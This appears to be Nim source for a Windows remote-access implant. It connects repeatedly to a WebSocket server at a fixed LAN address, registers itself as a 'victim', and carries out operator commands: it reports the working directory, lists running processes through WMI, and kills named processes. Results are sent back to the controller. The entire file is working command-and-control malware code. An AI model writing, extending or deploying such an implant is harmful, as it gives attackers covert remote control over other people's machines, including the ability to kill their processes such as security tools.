import asyncdispatch, ws, json, strutils, os,winim/com,winim

proc getProcessList(): seq[string] =
  var wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  var processList: seq[string] = @[]
  for i in wmi.execQuery("select * from win32_process"):
    processList.add(i.name)

  return processList

proc WCHARArrayToString(arr: array[0..259, WCHAR]): string =
  var resultStr = ""
  for i in 0..<arr.len:
    if arr[i] == 0'u16: 
      break
    resultStr.add(cast[char](arr[i]))
  return resultStr

proc killprocess(process:string):bool =
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE:
        echo "Failed to get process snapshot."
        return false

    var procEntry: PROCESSENTRY32
    procEntry.dwSize = int32(sizeof(PROCESSENTRY32))  

    if Process32First(snapshot, addr procEntry):
        while Process32Next(snapshot, addr procEntry) != 0:
            if WCHARArrayToString(procEntry.szExeFile) == process:
                let hProcess = OpenProcess(PROCESS_TERMINATE, false, procEntry.th32ProcessID)
                if hProcess != INVALID_HANDLE_VALUE:
                    let success = TerminateProcess(hProcess, 1)
                    echo hProcess
                    CloseHandle(hProcess)
                    CloseHandle(snapshot)
                    echo "Process terminated."
                    return true
                else:
                    echo "Failed to open process."
                    return false
    CloseHandle(snapshot)
    echo "something went wrong"

proc main() {.async.} =
  var ws: WebSocket

  
  while true:
    try:
      ws = await newWebSocket("ws://192.168.1.101:8080/ws")
      echo "Connected to WebSocket server!"
      break 
    except OSError as e:
      echo "Failed to connect to WebSocket server: ", e.msg
      echo "Retrying in 5 seconds..."
      await sleepAsync(5000)  

 
  let jsonObj = %* {"type": "set_role", "role": "victim"}
  let jsonMessage = $jsonObj  
  await ws.send(jsonMessage)
  echo "Sent message: ", jsonMessage


  while true:
    let message = await ws.receiveStrPacket()
    echo "Received message: ", message


    var parsedJson = parseJson(message)


    if parsedJson.hasKey("type") and parsedJson["type"].getStr() == "exec":
      let command = parsedJson["command"].getStr()
      let client = parsedJson["client_id"].getStr()

      if command == "pwd":
 
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": getCurrentDir()
        }

        
        await ws.send($responseJson)
        echo "Sent response: ", $responseJson

      elif command == "tasklist":
        let processes = getProcessList()
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": processes
        }
        await ws.send($responseJson)
        echo "Sent response: ", $responseJson

      elif command.startsWith("kill"):
        let processName = command.splitWhitespace()[1]  
        let killResult = killprocess(processName)

        
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": if killResult: "Process terminated: " & processName
                  else: "Failed to terminate process: " & processName
        }

        await ws.send($responseJson)
        echo "Sent response: ", $responseJson


  ws.close()
  echo "WebSocket connection closed."

waitFor main()
